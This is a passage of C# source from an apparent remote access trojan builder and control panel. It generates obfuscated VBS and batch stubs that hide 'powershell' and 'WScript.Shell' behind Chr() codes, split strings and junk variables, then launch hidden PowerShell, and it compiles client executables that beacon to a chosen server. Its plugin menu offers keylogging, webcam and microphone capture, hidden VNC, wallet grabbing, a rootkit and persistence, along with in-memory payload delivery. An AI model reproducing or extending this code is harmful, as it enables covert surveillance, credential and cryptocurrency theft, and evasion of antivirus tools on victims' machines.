            // ---- reconstruct payload var ----
            string payloadVar = VarName();
            sb.Append($"Dim {payloadVar}: {payloadVar} = ");
            for (int i = 0; i < chunkVars.Count; i++)
            {
                sb.Append($"StrReverse({chunkVars[i]})");
                if (i < chunkVars.Count - 1) sb.Append(" & ");
            }
            sb.AppendLine();

            // ---- build "powershell" from Chr() codes ----
            string psStr = "powershell";
            string psVar = VarName();
            sb.Append($"Dim {psVar}: {psVar} = ");
            var psCodes = new List<string>();
            foreach (char c in psStr)
                psCodes.Add($"Chr({(int)c})");
            sb.Append(string.Join(" & ", psCodes));
            sb.AppendLine();

            // ---- build "-NoP -W Hidden -Command" from Chr() codes ----
            string argStr = "-NoP -W Hidden -Command";
            string argVar = VarName();
            sb.Append($"Dim {argVar}: {argVar} = ");
            var argCodes = new List<string>();
            foreach (char c in argStr)
                argCodes.Add($"Chr({(int)c})");
            sb.Append(string.Join(" & ", argCodes));
            sb.AppendLine();

            // ---- build "WScript.Shell" from Chr() codes ----
            string comStr = "WScript.Shell";
            string comVar = VarName();
            sb.Append($"Dim {comVar}: {comVar} = ");
            var comCodes = new List<string>();
            foreach (char c in comStr)
                comCodes.Add($"Chr({(int)c})");
            sb.Append(string.Join(" & ", comCodes));
            sb.AppendLine();

            // ---- junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string jv = VarName();
                sb.AppendLine($"Dim {jv}: {jv} = Array({rng.Next(1, 9)}, {rng.Next(10, 99)})");
            }

            // ---- build final command (wrap payload in double quotes) ----
            string cmdVar = VarName();
            sb.AppendLine($"Dim {cmdVar}: {cmdVar} = {psVar} & \" \" & {argVar} & \" \" & Chr(34) & {payloadVar} & Chr(34)");

            // ---- create shell object and execute ----
            string shellVar = VarName();
            sb.AppendLine($"Dim {shellVar}");
            sb.AppendLine($"Set {shellVar} = CreateObject({comVar})");
            sb.AppendLine($"{shellVar}.Run {cmdVar}, 0, False");
            sb.AppendLine($"Set {shellVar} = Nothing");

            return sb.ToString();
        }

        private void GenerateBatButton_Click(object sender, RoutedEventArgs e)
        {
            UpdateStatus("Generating BAT stub...");
            builderOutputTextBox.Text = "Ready to generate stub...";

            string port = builderPortTextBox.Text.Trim();
            string password = builderPasswordBox.Text.Trim();
            string serverIp = builderIpTextBox.Text.Trim();
            string encKey = builderEncryptionKeyTextBox.Text.Trim();

            if (!ValidateBuilderInputs())
            {
                BuilderOutput("ERROR: Validation failed — check inputs");
                UpdateStatus("BAT stub generation failed.");
                return;
            }

            SaveSettings();

            bool silentMode = builderSilentCheckBox?.IsChecked == true;
            BuilderOutput($"Generating BAT stub — {serverIp}:{port} (silent={silentMode})");

            string batCode = GenerateBatCode(port, password, serverIp, encKey, silentMode);

            if (batCode.StartsWith("@rem ERROR"))
            {
                BuilderOutput("ERROR: BAT stub generation failed — template not found");
                UpdateStatus("BAT stub generation failed.");
                return;
            }

            BuilderOutput($"BAT stub generated ({batCode.Length} chars)");

            var dialog = new SaveFileDialog
            {
                Filter = "Batch file (*.bat)|*.bat",
                DefaultExt = ".bat",
                FileName = "Stub.bat"
            };

            if (dialog.ShowDialog() == true)
            {
                File.WriteAllText(dialog.FileName, batCode);
                AppendLog($"BAT stub saved to {dialog.FileName}");
                BuilderOutput($"Saved: {dialog.FileName}");
                UpdateStatus("BAT stub generated and saved.");
            }
            else
            {
                BuilderOutput("Save cancelled.");
                UpdateStatus("BAT stub generated (not saved).");
            }
        }

        private string GenerateBatCode(string port, string password, string serverIp, string encryptionKey, bool silentMode = false)
        {
            // Generate VBS stub (which already runs PowerShell silently with -W Hidden)
            string vbsCode = GenerateVbsCode(port, password, serverIp, encryptionKey, silentMode);
            if (vbsCode.StartsWith("' ERROR"))
            {
                AppendLog("ERROR: Cannot generate BAT — VBS stub generation failed.");
                return "@rem ERROR: VBS stub generation failed.";
            }

            // Base64-encode the VBS content
            byte[] vbsBytes = Encoding.UTF8.GetBytes(vbsCode);
            string b64Vbs = Convert.ToBase64String(vbsBytes);

            // PowerShell command: decode base64 → write .vbs → run silently via wscript.exe
            string psCmd = "$d=[Convert]::FromBase64String($env:B641+$env:B642);$p=[IO.Path]::GetTempPath()+'sv.vbs';[IO.File]::WriteAllBytes($p,$d);Start-Process wscript.exe -ArgumentList $p -WindowStyle Hidden";

            AppendLog($"VBS payload b64: {b64Vbs.Length} chars");

            return GenerateObfuscatedBat(b64Vbs, psCmd);
        }

        private static string GenerateObfuscatedBat(string b64Payload, string psCmd)
        {
            var rng = new Random();
            var sb = new StringBuilder();

            string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(4, 8));

            // ---- UTF-16 BOM ----
            sb.Append('\xFEFF');

            // ---- @echo off ----
            sb.AppendLine("@echo off");

            // ---- junk arithmetic at top ----
            int junkCount = rng.Next(3, 6);
            for (int i = 0; i < junkCount; i++)
            {
                string v = VarName();
                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}^{rng.Next(2, 99)}");
            }

            // ---- obfuscate "powershell" by splitting into 3-4 parts ----
            string psStr = "powershell";
            int psParts = rng.Next(3, 5);
            int psPartSize = (int)Math.Ceiling((double)psStr.Length / psParts);
            var psVars = new List<string>();
            for (int i = 0; i < psParts; i++)
            {
                int start = i * psPartSize;
                if (start >= psStr.Length) break;
                int len = Math.Min(psPartSize, psStr.Length - start);
                string chunk = psStr.Substring(start, len);
                string vn = VarName();
                psVars.Add(vn);
                sb.AppendLine($"set {vn}={chunk}");
            }

            // ---- obfuscate "-NoP -C" by splitting into 4-6 parts ----
            string argStr = "-NoP -C";
            int argParts = rng.Next(4, 7);
            int argPartSize = (int)Math.Ceiling((double)argStr.Length / argParts);
            var argVars = new List<string>();
            for (int i = 0; i < argParts; i++)
            {
                int start = i * argPartSize;
                if (start >= argStr.Length) break;
                int len = Math.Min(argPartSize, argStr.Length - start);
                string chunk = argStr.Substring(start, len);
                string vn = VarName();
                argVars.Add(vn);
                sb.AppendLine($"set {vn}={chunk}");
            }

            // ---- junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string v = VarName();
                sb.AppendLine($"set {v}={Guid.NewGuid().ToString("N").Substring(0, 8)}");
            }

            // ---- chunk the b64 payload into env vars (small chunks to avoid cmd.exe 8191 limit) ----
            int chunkCount = Math.Max(8, (int)Math.Ceiling(b64Payload.Length / 1200.0));
            int chunkSize = (int)Math.Ceiling((double)b64Payload.Length / chunkCount);
            var b64Vars = new List<string>();
            for (int i = 0; i < chunkCount; i++)
            {
                int start = i * chunkSize;
                if (start >= b64Payload.Length) break;
                int len = Math.Min(chunkSize, b64Payload.Length - start);
                string chunk = b64Payload.Substring(start, len);
                string vn = VarName();
                b64Vars.Add(vn);
                sb.AppendLine($"set {vn}={chunk}");
            }

            // ---- more junk interleave ----
            for (int i = 0; i < 2; i++)
            {
                string v = VarName();
                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}+{rng.Next(10, 999)}");
            }

            // ---- build PowerShell command that concatenates ALL chunk env vars directly ----
            // No B64 reconstruction needed — PowerShell reads each chunk var and concatenates
            string envConcat = string.Join("+", b64Vars.Select(v => "$env:" + v));
            string fullPsCmd = psCmd.Replace("$env:B641+$env:B642", envConcat);

            // ---- more junk ----
            for (int i = 0; i < 2; i++)
            {
                string v = VarName();
                sb.AppendLine($"set {v}={rng.Next(1000, 9999)}");
            }

            // ---- build command name from parts ----
            string cmdVar1 = VarName();
            sb.Append($"set {cmdVar1}=");
            for (int i = 0; i < psVars.Count; i++)
            {
                sb.Append($"%{psVars[i]}%");
            }
            sb.AppendLine();

            string cmdVar2 = VarName();
            sb.Append($"set {cmdVar2}=");
            for (int i = 0; i < argVars.Count; i++)
            {
                sb.Append($"%{argVars[i]}%");
            }
            sb.AppendLine();

            // ---- junk ----
            string jvLast = VarName();
            sb.AppendLine($"set {jvLast}=%random%");

            // ---- execute ----
            sb.AppendLine($"%{cmdVar1}% %{cmdVar2}% \"{fullPsCmd}\"");

            // ---- cleanup ----
            sb.AppendLine("endlocal");

            return sb.ToString();
        }

        private async void CompileExeButton_Click(object sender, RoutedEventArgs e)
        {
            UpdateStatus("Compiling EXE...");
            builderOutputTextBox.Text = "Ready to generate stub...";

            if (!ValidateBuilderInputs())
            {
                BuilderOutput("ERROR: Validation failed — check inputs");
                UpdateStatus("EXE compilation failed.");
                return;
            }

            SaveSettings();

            if (_serverCertificate == null)
            {
                AppendLog("ERROR: Server certificate not loaded. Set up a certificate first.");
                BuilderOutput("ERROR: Server certificate not loaded. Set up a certificate first.");
                UpdateStatus("EXE compilation failed.");
                return;
            }

            bool silentMode = builderSilentCheckBox?.IsChecked == true;

            string stubCode = LoadStubTemplate("CSharpStub/Stub.cs");
            if (string.IsNullOrEmpty(stubCode))
            {
                AppendLog("ERROR: C# stub template not found.");
                BuilderOutput("ERROR: C# stub template not found.");
                UpdateStatus("EXE compilation failed.");
                return;
            }

            BuilderOutput($"Compiling EXE stub — {builderIpTextBox.Text.Trim()}:{builderPortTextBox.Text.Trim()}");
            BuilderOutput($"Silent mode: {silentMode}");
            AppendLog($"Replacing placeholders: SILENT_MODE={silentMode}");

            string certBase64 = Convert.ToBase64String(
                CertificateManager.GetCertificatePublicKeyBytes(_serverCertificate));

            stubCode = stubCode
                .Replace("{{SERVER_URL}}", $"{builderIpTextBox.Text.Trim()}:{builderPortTextBox.Text.Trim()}")
                .Replace("{{CERTIFICATE}}", certBase64)
                .Replace("{{SILENT_MODE}}", silentMode ? "true" : "false")
                .Replace("{{PASSWORD}}", builderPasswordBox.Text);

            if (stubCode.Contains("{{SILENT_MODE}}"))
            {
                AppendLog("ERROR: SILENT_MODE placeholder was not replaced.");
                BuilderOutput("ERROR: SILENT_MODE placeholder was not replaced.");
                UpdateStatus("EXE compilation failed.");
                return;
            }
            if (stubCode.Contains("{{SERVER_URL}}") || stubCode.Contains("{{CERTIFICATE}}") || stubCode.Contains("{{SILENT_MODE}}") || stubCode.Contains("{{PASSWORD}}"))
            {
                AppendLog("ERROR: Some placeholders were not replaced.");
                BuilderOutput("ERROR: Some placeholders were not replaced.");
                UpdateStatus("EXE compilation failed.");
                return;
            }

            var saveDialog = new SaveFileDialog
            {
                Filter = "Executable (*.exe)|*.exe",
                FileName = "ClientStub.exe"
            };

            if (saveDialog.ShowDialog() == true)
                await CompileToExe(stubCode, saveDialog.FileName, silentMode);
            else
            {
                BuilderOutput("Save cancelled.");
                UpdateStatus("EXE compilation cancelled.");
            }
        }

        private void BuilderOutput(string message)
        {
            Dispatcher.Invoke(() =>
            {
                string timestamp = DateTime.Now.ToString("HH:mm:ss");
                string current = builderOutputTextBox.Text;
                if (current == "Ready to generate stub...")
                    builderOutputTextBox.Text = $"[{timestamp}] {message}";
                else
                    builderOutputTextBox.Text = $"{current}\n[{timestamp}] {message}";
                builderOutputTextBox.ScrollToEnd();
            });
        }

        private bool ValidateBuilderInputs()
        {
            if (!int.TryParse(builderPortTextBox.Text.Trim(), out int port) || port <= 0 || port > 65535)
            {
                AppendLog("ERROR: Enter a valid port (1-65535).");
                BuilderOutput("ERROR: Enter a valid port (1-65535).");
                return false;
            }

            if (string.IsNullOrWhiteSpace(builderPasswordBox.Text) || builderPasswordBox.Text.Trim().Length < 12)
            {
                AppendLog("ERROR: Server password must be at least 12 characters.");
                BuilderOutput("ERROR: Server password must be at least 12 characters.");
                return false;
            }

            if (string.IsNullOrWhiteSpace(builderIpTextBox.Text))
            {
                AppendLog("ERROR: Server IP is required.");
                BuilderOutput("ERROR: Server IP is required.");
                return false;
            }

            return true;
        }

        private string GenerateStubCode(string port, string password, string serverIp, string encryptionKey, bool silentMode = false)
        {
            string content;

            string templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PSStub", "PSStub_Direct.ps1");

            content = LoadStubTemplate("PSStub/PSStub_Direct.ps1");
            if (string.IsNullOrEmpty(content))
            {
                AppendLog("ERROR: PowerShell stub template not found.");
                AppendLog($"Looked for file at: {templatePath}");
                return "# Template not found.";
            }

            if (File.Exists(templatePath))
            {
                string templateHash = ComputeFileHash(templatePath);
                AppendLog($"Template loaded from file. Hash: {templateHash.Substring(0, 16)}...");
            }
            else
            {
                AppendLog("Template loaded from embedded resource.");
            }

            string serverAddress = $"{serverIp}:{port}";
            AppendLog($"Stub target: {serverAddress}");

            content = content
                .Replace("{{SERVER_URL}}", serverAddress)
                .Replace("{{SERVER_IP}}", serverIp)
                .Replace("{{SERVER_PORT}}", port)
                .Replace("{{PASSWORD}}", password)
                .Replace("{{ENCRYPTION_KEY}}", encryptionKey);

            if (content.Contains("{{SERVER_URL}}") || content.Contains("{{PASSWORD}}") ||
                content.Contains("{{ENCRYPTION_KEY}}") || content.Contains("{{SERVER_IP}}") ||
                content.Contains("{{SERVER_PORT}}"))
            {
                AppendLog("WARNING: Some placeholders were not replaced. Check template format.");
            }

            if (silentMode)
            {
                AppendLog("Silent mode enabled — stripping comments and debug output from PowerShell stub.");
                content = StripPowerShellDebug(content);
            }

            return content;
        }

        private static string StripPowerShellDebug(string content)
        {
            content = Regex.Replace(content, @"<#[\s\S]*?#>", "");
            content = Regex.Replace(content, @"(?m)^[ \t]*#.*$", "");
            content = Regex.Replace(content, @"(?m)^[ \t]*Write-Host.*$", "");
            content = Regex.Replace(content, @"(\r?\n){3,}", "$1$1");
            return content.Trim();
        }

        private string LoadStubTemplate(string relativePath)
        {
            string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, relativePath);
            if (File.Exists(fullPath))
                return File.ReadAllText(fullPath);

            var assembly = Assembly.GetExecutingAssembly();
            string resourceName = assembly.GetManifestResourceNames()
                .FirstOrDefault(n => n.EndsWith(relativePath.Replace("/", ".")));

            if (resourceName != null)
            {
                using var stream = assembly.GetManifestResourceStream(resourceName);
                using var reader = new StreamReader(stream);
                return reader.ReadToEnd();
            }

            return null;
        }

        // ==================== EXE COMPILATION ====================

        private async Task CompileToExe(string sourceCode, string outputPath, bool silentMode)
        {
            try
            {
                Dispatcher.Invoke(() => builderOutputTextBox.Text = "Ready to generate stub...");

                if (!IsDotnetSdkAvailable())
                {
                    AppendLog("ERROR: .NET SDK not found. Install from https://dotnet.microsoft.com/download");
                    BuilderOutput("ERROR: .NET SDK not found. Install from https://dotnet.microsoft.com/download");
                    UpdateStatus("EXE compilation failed — .NET SDK required.");
                    return;
                }

                AppendLog("Creating temporary build project...");
                BuilderOutput("Creating temporary build project...");

                if (silentMode)
                {
                    AppendLog("Silent mode enabled — stub will run with no visible window.");
                    BuilderOutput("Silent mode enabled — stub will run with no visible window.");
                }
                else
                {
                    AppendLog("Normal mode — stub will show a console window.");
                    BuilderOutput("Normal mode — stub will show a console window.");
                }

                string buildDir = Path.Combine(
                    Path.GetTempPath(),
                    "stub_build_" + Guid.NewGuid().ToString("N").Substring(0, 8));
                Directory.CreateDirectory(buildDir);

                try
                {
                    string stubCsPath = Path.Combine(buildDir, "Stub.cs");
                    File.WriteAllText(stubCsPath, sourceCode, Encoding.UTF8);

                    string outputType = silentMode ? "WinExe" : "Exe";

                    string csprojContent = $@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <OutputType>{outputType}</OutputType>
    <TargetFramework>net472</TargetFramework>
    <LangVersion>7.3</LangVersion>
    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>
    <DebugType>none</DebugType>
    <DebugSymbols>false</DebugSymbols>
    <Optimize>true</Optimize>
    <AppendTargetFrameworkToOutputPath>false</AppendTargetFrameworkToOutputPath>
    <AppendRuntimeIdentifierToOutputPath>false</AppendRuntimeIdentifierToOutputPath>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include=""System.Management"" />
    <Reference Include=""System.Net.Http"" />
    <Reference Include=""System.Windows.Forms"" />
    <Reference Include=""System.Drawing"" />
    <Reference Include=""System.ServiceProcess"" />
  </ItemGroup>
</Project>";

                    string csprojPath = Path.Combine(buildDir, "Stub.csproj");
                    File.WriteAllText(csprojPath, csprojContent, Encoding.UTF8);

                    AppendLog($"Build directory: {buildDir}");
                    AppendLog($"Output type: {outputType} ({(silentMode ? "silent" : "console visible")})");
                    AppendLog("Compiling with: dotnet build (targeting .NET Framework 4.7.2)");
                    BuilderOutput($"Build directory: {buildDir}");
                    BuilderOutput($"Output type: {outputType}");
                    BuilderOutput("Compiling with: dotnet build (targeting .NET Framework 4.7.2)");
                    BuilderOutput("─" + new string('─', 60));

                    string publishDir = Path.Combine(buildDir, "out");

                    var psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "dotnet",
                        Arguments = $"build -c Release -o \"{publishDir}\"",
                        WorkingDirectory = buildDir,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    var process = new System.Diagnostics.Process { StartInfo = psi };

                    var stdout = new StringBuilder();
                    var stderr = new StringBuilder();

                    process.OutputDataReceived += (s, args) =>
                    {
                        if (args.Data != null)
                        {
                            stdout.AppendLine(args.Data);
                            string line = args.Data;
                            Dispatcher.BeginInvoke(() => {
                                AppendLog($"  [build] {line}");
                                if (!string.IsNullOrWhiteSpace(line))
                                    BuilderOutput($"  {line}");
                            });
                        }
                    };

                    process.ErrorDataReceived += (s, args) =>
                    {
                        if (args.Data != null)
                        {
                            stderr.AppendLine(args.Data);
                            string line = args.Data;
                            Dispatcher.BeginInvoke(() => {
                                AppendLog($"  [build-err] {line}");
                                if (!string.IsNullOrWhiteSpace(line))
                                    BuilderOutput($"  [ERR] {line}");
                            });
                        }
                    };

                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    bool exited = await Task.Run(() => process.WaitForExit(120000));

                    if (!exited)
                    {
                        try { process.Kill(); } catch { }
                        AppendLog("ERROR: Build timed out after 120 seconds.");
                        BuilderOutput("ERROR: Build timed out after 120 seconds.");
                        UpdateStatus("EXE compilation timed out.");
                        return;
                    }

                    if (process.ExitCode != 0)
                    {
                        BuilderOutput("─" + new string('─', 60));
                        AppendLog($"ERROR: Build failed with exit code {process.ExitCode}");
                        BuilderOutput($"ERROR: Build failed with exit code {process.ExitCode}");
                        if (stderr.Length > 0)
                        {
                            AppendLog("Build errors:");
                            BuilderOutput("Build errors:");
                            foreach (string line in stderr.ToString().Split('\n').Take(30))
                            {
                                if (!string.IsNullOrWhiteSpace(line))
                                {
                                    AppendLog($"  {line.Trim()}");
                                    BuilderOutput($"  {line.Trim()}");
                                }
                            }
                        }
                        BuilderOutput("─" + new string('─', 60));
                        UpdateStatus("EXE compilation failed.");
                        return;
                    }

                    string compiledExe = Path.Combine(publishDir, "Stub.exe");

                    if (!File.Exists(compiledExe))
                    {
                        string[] exeFiles = Directory.GetFiles(publishDir, "*.exe", SearchOption.AllDirectories);
                        if (exeFiles.Length > 0)
                        {
                            compiledExe = exeFiles[0];
                        }
                        else
                        {
                            AppendLog("ERROR: Build succeeded but no .exe found in output directory.");
                            BuilderOutput("ERROR: Build succeeded but no .exe found in output directory.");
                            foreach (string f in Directory.GetFiles(publishDir, "*.*", SearchOption.AllDirectories))
                            {
                                AppendLog($"  {Path.GetFileName(f)}");
                                BuilderOutput($"  {Path.GetFileName(f)}");
                            }
                            UpdateStatus("EXE compilation failed.");
                            return;
                        }
                    }

                    File.Copy(compiledExe, outputPath, true);

                    long fileSize = new FileInfo(outputPath).Length;
                    string fileSizeStr = fileSize < 1024 * 1024
                        ? $"{fileSize / 1024.0:F1} KB"
                        : $"{fileSize / (1024.0 * 1024.0):F1} MB";

                    BuilderOutput("─" + new string('─', 60));
                    AppendLog($"EXE compiled successfully: {outputPath}");
                    BuilderOutput($"EXE compiled successfully: {outputPath}");
                    AppendLog($"Size: {fileSizeStr}");
                    BuilderOutput($"Size: {fileSizeStr}");
                    AppendLog($"Mode: {(silentMode ? "Silent (no window)" : "Normal (console visible)")}");
                    BuilderOutput($"Mode: {(silentMode ? "Silent (no window)" : "Normal (console visible)")}");
                    AppendLog("Target: .NET Framework 4.7.2");
                    BuilderOutput("Target: .NET Framework 4.7.2");
                    UpdateStatus($"EXE compiled successfully ({(silentMode ? "silent" : "normal")}).");
                }
                finally
                {
                    try
                    {
                        await Task.Delay(500);
                        if (Directory.Exists(buildDir))
                            Directory.Delete(buildDir, true);
                    }
                    catch (Exception cleanupEx)
                    {
                        AppendLog($"Note: Could not clean temp dir: {cleanupEx.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                AppendLog($"Compilation error: {ex.Message}");
                BuilderOutput($"Compilation error: {ex.Message}");
                if (ex.InnerException != null)
                {
                    AppendLog($"Inner: {ex.InnerException.Message}");
                    BuilderOutput($"Inner: {ex.InnerException.Message}");
                }
                BuilderOutput("─" + new string('─', 60));
                UpdateStatus("EXE compilation failed.");
            }
        }

        private bool IsDotnetSdkAvailable()
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = "--list-sdks",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var proc = System.Diagnostics.Process.Start(psi);
                if (proc == null) return false;

                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit(5000);

                if (proc.ExitCode != 0) return false;

                bool hasSdk = !string.IsNullOrWhiteSpace(output) && output.Trim().Length > 0;

                if (hasSdk)
                {
                    string firstLine = output.Split('\n').FirstOrDefault()?.Trim() ?? "";
                    AppendLog($"Found .NET SDK: {firstLine}");
                }

                return hasSdk;
            }
            catch
            {
                return false;
            }
        }

        // ==================== PLUGIN SYSTEM ====================

        private void BuildClientContextMenu()
        {
            Dispatcher.BeginInvoke(() =>
            {
                var contextMenu = new ContextMenu();

                var header = new MenuItem
                {
                    Header = "── Plugins ──",
                    IsEnabled = false,
                    FontWeight = FontWeights.SemiBold
                };
                header.SetResourceReference(MenuItem.ForegroundProperty, "PrimaryBrush");
                contextMenu.Items.Add(header);
                contextMenu.Items.Add(new Separator());

                var pluginGroups = new[]
                {
                    ("🖥  Administration",       new[] { "shell", "filemgr", "regedit", "procmgr", "rootkit" }),
                    ("🌐  Network & Proxy",      new[] { "socks5" }),
                    ("📹  Surveillance",         new[] { "screenmon", "keylog", "webcam", "micmon" }),
                    ("💻  Remote Access",        new[] { "hvnc" }),
                    ("🔍  Grabber",              new[] { "walletgrab", "botkiller" }),
                };

                var loadedPlugins = _pluginHost.LoadedPlugins;
                var hiddenPlugins = new HashSet<string> {  };
                var remaining = new HashSet<string>(loadedPlugins.Keys);
                remaining.ExceptWith(hiddenPlugins);

                foreach (var (groupName, pluginIds) in pluginGroups)
                {
                    var groupMenu = new MenuItem { Header = groupName };
                    bool hasItems = false;
                    foreach (var id in pluginIds)
                    {
                        if (!loadedPlugins.TryGetValue(id, out var plugin)) continue;
                        if (hiddenPlugins.Contains(id)) continue;
                        remaining.Remove(id);
                        groupMenu.Items.Add(BuildPluginMenuItem(plugin));
                        hasItems = true;
                    }
                    if (hasItems)
                        contextMenu.Items.Add(groupMenu);
                }

                var clientGroup = new MenuItem { Header = "⚙️  Management" };
                var clientPluginIds = new[] { "persistence", "update", "sysinfo" };
                foreach (var id in clientPluginIds)
                {
                    if (!loadedPlugins.TryGetValue(id, out var plugin)) continue;
                    remaining.Remove(id);
                    clientGroup.Items.Add(BuildPluginMenuItem(plugin));
                }
                if (clientGroup.Items.Count > 0)
                    contextMenu.Items.Add(clientGroup);

                if (remaining.Count > 0)
                {
                    var miscGroup = new MenuItem { Header = "🧩  Other" };
                    foreach (var id in remaining.ToList())
                    {
                        if (!loadedPlugins.TryGetValue(id, out var plugin)) continue;
                        miscGroup.Items.Add(BuildPluginMenuItem(plugin));
                    }
                    contextMenu.Items.Add(miscGroup);
                }

                contextMenu.Items.Add(new Separator());

                var sendFileMenu = new MenuItem { Header = "📁  Send File" };
                var execModeMemItem = new MenuItem { Header = "⚡  In-Memory" };
                execModeMemItem.Click += (s, args) => SendFileWithMode(ExecutionMode.InMemory);
                sendFileMenu.Items.Add(execModeMemItem);
                var execModeDiskItem = new MenuItem { Header = "💾  Drop to Disk" };
                execModeDiskItem.Click += (s, args) => SendFileWithMode(ExecutionMode.DropToDisk);
                sendFileMenu.Items.Add(execModeDiskItem);
                contextMenu.Items.Add(sendFileMenu);

                contextMenu.Items.Add(new Separator());

                var stopAllItem = new MenuItem { Header = "⛔  Stop All Plugins" };
                stopAllItem.SetResourceReference(MenuItem.ForegroundProperty, "DangerBrush");
                stopAllItem.Click += async (s, args) => await StopAllPluginsForSelectedClients();
                contextMenu.Items.Add(stopAllItem);

                var activeItem = new MenuItem { Header = "📋  Show Active Plugins" };
                activeItem.SetResourceReference(MenuItem.ForegroundProperty, "TextSecondaryBrush");
                activeItem.Click += (s, args) => ShowActivePluginsForSelectedClients();
                contextMenu.Items.Add(activeItem);

                clientList.ContextMenu = contextMenu;
            });
        }

        private MenuItem BuildPluginMenuItem(IServerPlugin plugin)
        {
            string multiTag = plugin is IMultiClientPlugin ? " [Multi]" : "";
            var item = new MenuItem
            {
                Header = $"🔌  {plugin.DisplayName}{multiTag}",
                Tag = plugin.PluginId,
                ToolTip = $"{plugin.Description}\nVersion: {plugin.Version}"
            };
            string capturedPluginId = plugin.PluginId;
            item.Click += async (s, args) =>
            {
                await LaunchPluginForSelectedClients(capturedPluginId);
            };
            return item;
        }

        private void SendFileWithMode(ExecutionMode mode)
        {
            var selectedClients = ClientItems.Where(c => c.IsSelected).ToList();

            if (selectedClients.Count == 0 && clientList.SelectedItem is ClientItem singleClient)
                selectedClients = new List<ClientItem> { singleClient };

            if (selectedClients.Count == 0)
            {
                AppendLog("No clients selected.");
                return;
            }

            if (string.IsNullOrEmpty(_selectedFilePath) || !File.Exists(_selectedFilePath))
            {
                var dialog = new OpenFileDialog
                {
                    Filter = "Executable Files (*.exe;*.dll;*.bat;*.ps1)|*.exe;*.dll;*.bat;*.ps1|All Files (*.*)|*.*",
                    Title = $"Select file for {(mode == ExecutionMode.InMemory ? "in-memory" : "drop-to-disk")} execution"
                };

                if (dialog.ShowDialog() != true)
                    return;

                _selectedFilePath = dialog.FileName;
                UpdateLastFileLabel();
            }

            if (_tcpServer == null)
            {
                AppendLog("Server is not running.");
                return;
            }

            var fileInfo = new FileInfo(_selectedFilePath);
            if (fileInfo.Length > 50 * 1024 * 1024)
            {
                AppendLog("File exceeds 50MB limit.");
                return;
            }

            if (mode == ExecutionMode.InMemory)
                ValidateInMemoryCompatibility(_selectedFilePath);

            string fileHash = ComputeFileHash(_selectedFilePath);
            string modeStr = mode == ExecutionMode.InMemory ? "IN-MEMORY" : "DROP-TO-DISK";

            foreach (var client in selectedClients)
            {
                string sendId = ResolveRawClientId(client.Name);
                _tcpServer.EnqueueFileForClient(sendId, _selectedFilePath, fileHash, mode);
                AppendLog($"[{modeStr}] File queued for {client.Name}: {fileInfo.Name}");
            }
        }

        private async Task LaunchPluginForSelectedClients(string pluginId)
        {
            var selectedClients = ClientItems.Where(c => c.IsSelected).ToList();

            if (selectedClients.Count == 0)
            {
                if (clientList.SelectedItem is ClientItem singleClient)
                    selectedClients = new List<ClientItem> { singleClient };
                else
                {
                    AppendLog("No clients selected. Select one or more clients first.");
                    return;
                }
            }

            if (_tcpServer == null)
            {
                AppendLog("Server is not running. Start the server before launching plugins.");
                return;
            }

            if (_pluginHost.LoadedPlugins.TryGetValue(pluginId, out var plugin) && plugin is IMultiClientPlugin)
            {
                await OpenMultiClientPlugin(pluginId, selectedClients);
            }
            else
            {
                foreach (var client in selectedClients)
                {
                    string rawId = ResolveRawClientId(client.Name);
                    if (!_tcpServer.IsClientConnected(rawId))
                    {
                        AppendLog($"Client '{client.Name}' is not connected. Skipping plugin launch.");
                        continue;
                    }

                    await OpenPluginForClient(client.Name, pluginId);
                }
            }
        }

        private async Task OpenMultiClientPlugin(string pluginId, List<ClientItem> clients)
        {
            string windowKey = $"multi:{pluginId}";

            if (!_pluginHost.LoadedPlugins.TryGetValue(pluginId, out var plugin))
            {
                AppendLog($"Plugin '{pluginId}' not found.");
                return;
            }

            var multiPlugin = plugin as IMultiClientPlugin;
            if (multiPlugin == null) return;

            foreach (var client in clients)
            {
                string rawId = ResolveRawClientId(client.Name);
                if (!_tcpServer.IsClientConnected(rawId))
                {
                    AppendLog($"Client '{client.Name}' is not connected. Skipping.");
                    continue;
                }

                var context = await _pluginHost.StartPluginForClient(client.Name, pluginId);
                if (context != null)
                {
                    multiPlugin.AddClient(client.Name, context);
                    AppendLog($"Added client '{client.Name}' to {plugin.DisplayName}.");
                }
            }

            if (_pluginWindows.TryGetValue(windowKey, out var existingWindow))
            {
                Dispatcher.BeginInvoke(() =>
                {
                    if (existingWindow.WindowState == WindowState.Minimized)
                        existingWindow.WindowState = WindowState.Normal;
                    existingWindow.Activate();
                });
                return;
            }

            Dispatcher.BeginInvoke(() =>
            {
                if (_pluginWindows.TryGetValue(windowKey, out var alreadyOpenWindow))
                {
                    if (alreadyOpenWindow.WindowState == WindowState.Minimized)
                        alreadyOpenWindow.WindowState = WindowState.Normal;
                    alreadyOpenWindow.Activate();
                    return;
                }

                UserControl pluginUI;
                try
                {
                    pluginUI = multiPlugin.CreateSharedUI();
                }
                catch (Exception ex)
                {
                    AppendLog($"Failed to create UI for plugin '{pluginId}': {ex.Message}");
                    return;
                }

                var pluginWindow = new Window
                {
                    Title = $"{plugin.DisplayName} — Multi-Client",
                    Width = 800,
                    Height = 580,
                    MinWidth = 500,
                    MinHeight = 360,
                    Owner = this,
                    WindowStartupLocation = WindowStartupLocation.CenterOwner,
                    Content = pluginUI,
                    Tag = windowKey
                };
                pluginWindow.SetResourceReference(Window.BackgroundProperty, "BackgroundBrush");
                pluginWindow.SetResourceReference(Window.ForegroundProperty, "TextPrimaryBrush");

